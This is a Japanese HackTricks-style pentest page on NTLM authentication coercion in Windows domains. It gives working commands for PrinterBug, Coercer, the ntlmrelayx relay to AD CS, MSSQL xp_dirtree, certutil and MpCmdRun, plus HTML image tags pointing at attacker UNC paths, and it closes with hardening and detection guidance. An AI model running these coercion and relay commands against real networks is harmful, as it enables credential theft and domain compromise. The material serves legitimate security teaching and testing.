# 特権認証でのNTLM強制

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、サードパーティ依存を避けるために MIDL compiler を使用して C# で実装された、**リモート認証トリガー**の**コレクション**です。

## Spooler Service の悪用

_**Print Spooler**_ サービスが**有効な場合、**既知の AD 認証情報を使って、Domain Controller のプリントサーバーに新しい印刷ジョブの**更新を要求し、通知を**任意のシステムに送信するよう指定できます。\
プリンターが任意のシステムに通知を送信する場合、その**システムに対して認証する**必要がある点に注意してください。したがって、攻撃者は _**Print Spooler**_ サービスに任意のシステムへの認証を強制でき、この認証ではサービスが**コンピューターアカウントを使用**します。

内部では、古典的な **PrinterBug** プリミティブは、**`\\PIPE\\spoolss`** 経由で **`RpcRemoteFindFirstPrinterChangeNotificationEx`** を悪用します。攻撃者はまずプリンターまたはサーバーのハンドルを開き、`pszLocalMachine` に偽のクライアント名を指定します。すると、対象のスプーラーは**攻撃者が制御するホストに向けて**通知チャネルを作成します。これが、直接コードを実行するのではなく、**外向きの認証強制**が発生する理由です。<sup>[[2]](#references)</sup>\
スプーラー自体の **RCE/LPE** を探している場合は、[PrintNightmare](printnightmare.md) を確認してください。このページでは**認証強制とリレー**に焦点を当てています。

### ドメイン内の Windows サーバーの検索

PowerShell を使って Windows ホストを一覧表示します。サーバーは通常、最優先のターゲットなので、まずサーバーに注目してください：

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Spoolerサービスの待ち受け状況の確認

@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を少し改変したものを使って、Spooler Serviceが待ち受けているか確認します。

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Linuxでは `rpcdump.py` を使って、**MS-RPRN** プロトコルを探すこともできます：

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

または、Linux から **NetExec/CrackMapExec** を使ってホストをすばやくテストできます：

```bash
nxc smb targets.txt -u user -p password -M spooler
```

スプーラー endpoint が存在するかどうかを確認するだけでなく、**coercion surfaces を列挙**したい場合は、**Coercer scan mode** を使用します。<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

これは、EPMでエンドポイントを確認できても、印刷RPCインターフェースが登録されていることしか分からないためです。現在の権限であらゆる認証強制手法にアクセスできることや、ホストが利用可能な認証フローを開始することまでは保証されません。

### サービスに任意のホストに対する認証を要求する

[元のリポジトリにあるSpoolSampleをコンパイル](https://github.com/leechristensen/SpoolSample)できます。

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

または、Linuxを使用している場合は[**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用します。

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

**Coercer**を使うと、スプーラーインターフェースを直接標的にでき、どのRPCメソッドが公開されているか推測する必要がありません。<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### 最新のRPC-over-TCPコールバック

`RpcRemoteFindFirstPrinterChangeNotificationEx` の呼び出しが成功しても、TCP/445で通信が発生するとは限りません。**Windows 11 22H2以降では、印刷通信にRPC over TCPがデフォルトで使用されます**。ポリシーで有効にするか、`RpcUseNamedPipeProtocol=1` を設定しない限り、名前付きパイプ経由のRPCは無効です。そのため、従来のSMB専用リスナーでは、トリガーが送信されたと報告されてもコールバックを受信できないことがあります。Microsoftは、通常の印刷RPCではTCP/135（Endpoint Mapper）と動的RPCポートを使用すると説明しています。組織はこのポート範囲を制限したり、固定の印刷RPCポートを指定したりできます。<sup>[[10]](#references)</sup>

現在の**Impacket `ntlmrelayx.py`**には、RPCリレーサーバーと簡易Endpoint Mapperが含まれており、デフォルトでTCP/135上で有効です。この機能は、PrinterBugからAD CSへの連鎖を実証する形で、2025年6月にマージされました。これにより、被害者がSMB/WebDAVにフォールバックしない場合でも、認証済みのRPCコールバックをリレーできます。<sup>[[11]](#references)</sup>

RPCリレー/EPMのサポートは、**Impacket 0.13.0以降**に含まれています。TCP/135リスナーが見つからない問題を調査する前に、古いパッケージ版の `ntlmrelayx.py` が実行されていないか確認してください。ヘルプ出力にRPCサーバー関連のスイッチが両方表示されるはずです。<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

`Setting up RPC Server on port 135` と `RPCD: Received connection` を relay の出力で探してください。RPC call が想定どおりのエラーを返すのに listener に何も届かない場合は、victim の print RPC transport policy、outbound filtering、DNS resolution、および別の process がすでに TCP/135 を使用していないか確認してください。また、`ntlmrelayx` が `--no-rpc-server` を指定して起動されていないことも確認してください。

### WebClient を使って SMB の代わりに HTTP を強制する

**RPC over named pipes**（legacy build または policy を復元した動作）を使用しているシステムでは、従来の PrinterBug によって通常、`\\attacker\share` への **SMB** authentication が発生します。これは **capture**、**HTTP target への relay**、または **SMB signing がない環境への relay** に引き続き有効です。\
ただし、**SMB から SMB への relay** は **SMB signing** によってブロックされることが多いため、operator は代わりに **HTTP/WebDAV** authentication を強制したい場合があります。これは、上述した RPC-over-TCP の動作に対する fallback ではありません。

target で **WebClient** service が実行されている場合、Windows が **HTTP 経由の WebDAV** を使うよう、次の形式で listener を指定できます。

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

これは、**`ntlmrelayx --adcs`** やその他の HTTP relay targets と組み合わせる場合に特に有効です。強制された接続で SMB relay が可能であることに依存せずに済みます。重要な注意点として、HTTP/WebDAV variant を機能させるには、被害者側で **WebClient が実行中である必要があります**。

### Unconstrained Delegation との組み合わせ

攻撃者が [Unconstrained Delegation](unconstrained-delegation.md) が設定されたコンピューターを侵害している場合、**プリンターにそのコンピューターへの認証を強制できます**。その後、プリンターのコンピューターアカウントの **TGT** が Unconstrained Delegation ホストのメモリにキャッシュされるため、攻撃者はこれを取得し、[Pass the Ticket](pass-the-ticket.md) で再利用できます。

### 検出とハードニングに関する注意点

印刷を行わない DC、PAW、またはサーバーから PrinterBug を排除する最も確実な方法は、Spooler を停止して無効化することです。印刷が必要な場合は、コールバック経路の TCP/445 をブロックすれば十分だと考えるのではなく、考えられるすべての relay 先（SMB server signing、LDAP signing/channel binding、AD CS などの HTTP サービス上の EPA）をハードニングしてください。<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

ホストで引き続き**ローカル印刷**が必要な場合は、より限定的な制御として GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled` を設定できます。これにより、サービスをローカルで利用可能なまま、スプーラーがリモートクライアント接続（およびプリンター共有）を受け付けないようにできます。適用後にスプーラーを再起動し、上記の MS-RPRN 到達性チェックを再度実行してください。<sup>[[13]](#references)</sup>

検出では、MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` への認証済み呼び出し（特に、ローカルではないコールバック値を伴う opnum 62/65）と、その直後にスプーラーホストから発生するアウトバウンド SMB、HTTP、または RPC 接続を相関させます。`\PIPE\spoolss` へのアクセスだけでなく、**インターフェース UUID/opnum と送信元/宛先の組み合わせ**をベースライン化してください。現在の印刷スタックでは、コールバックに RPC-over-TCP が使われる場合があるためです。<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix（アウトバウンド認証を引き起こすインターフェース/opnum）
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - ツール: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - 注記: 同じスプーラーパイプ上の非同期印刷インターフェース。特定のホストで到達可能なメソッドを列挙するには Coercer を使用します。<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (また、\\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon 経由でも利用可能)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - よく悪用される Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - ツール: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - ツール: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - ツール: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - ツール: CheeseOunce<sup>[[1]](#references)</sup>

注: これらのメソッドは、UNC パス（例: `\\attacker\share`）を指定できるパラメーターを受け取ります。処理時に Windows はその UNC に対して（マシンまたはユーザーのコンテキストで）認証するため、NetNTLM の取得やリレーが可能になります。\
スプーラーの悪用では、プロトコル仕様にサーバーが `pszLocalMachine` で指定されたクライアントに通知チャネルを作成すると明記されているため、**MS-RPRN opnum 65** が今も最も一般的で、最もよく文書化されたプリミティブです。<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- インターフェース: \\PIPE\\even 上の MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- 呼び出しシグネチャ: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- 効果: ターゲットは指定されたバックアップログのパスを開こうとし、攻撃者が制御する UNC に対して認証します。<sup>[[1]](#references)</sup>
- 実用例: Tier 0 資産（DC/RODC/Citrix など）に NetNTLM を送信させ、その後 AD CS エンドポイント（ESC8/ESC11 のシナリオ）やその他の特権サービスにリレーします。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` 攻撃は、**Exchange Server の `PushSubscription` 機能**に見つかった欠陥を利用します。この機能により、メールボックスを持つドメインユーザーであれば誰でも、Exchange サーバーに任意のクライアント指定ホストへの HTTP 認証を強制できます。

既定では、**Exchange サービスは SYSTEM として実行され**、過剰な権限を付与されています（具体的には、2019 年の Cumulative Update 以前はドメインに対する **WriteDacl 権限**を持ちます）。この欠陥を悪用すると、**情報を LDAP にリレーし、その後ドメインの NTDS データベースを抽出できます**。LDAP へのリレーが不可能な場合でも、この欠陥を使ってドメイン内の他のホストにリレーし、認証できます。この攻撃に成功すると、認証済みのドメインユーザーアカウントだけで Domain Admin に即座にアクセスできます。

## Windows 内部

すでに Windows マシンに侵入している場合は、次のコマンドで特権アカウントを使って Windows にサーバーへの接続を強制できます。

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

または、次の別の手法を使用できます: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoft署名済みバイナリ）を使用して、NTLM認証を強制できます:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### メール経由

侵害したいマシンにログインするユーザーの**メールアドレス**が分かっている場合、次のような**1x1画像を含むメール**を送信するだけで済みます。

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

被害者がこれを開くと、Windowsは認証を試みます。

### MitM

MitM攻撃を実行して、被害者が閲覧するページにHTMLを挿入できる場合は、次のような画像の挿入を試してください。

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## NTLM 認証を強制・フィッシングするその他の方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 のクラック

[NTLMv1 のチャレンジをキャプチャできた場合、こちらを読んでクラックする方法を確認してください](../ntlm/index.html#ntlmv1-attack)。\
_NTLMv1 をクラックするには、Responder の challenge を「1122334455667788」に設定する必要があることを忘れないでください。_



## References

- [1] [Unit 42 – 認証強制は進化し続ける](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog リモート プロトコル](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11 の印刷に関する RPC 接続の更新](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx 用 RPC relay server と Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 リリース](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: クライアント接続を受け入れるよう Print Spooler を許可する](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
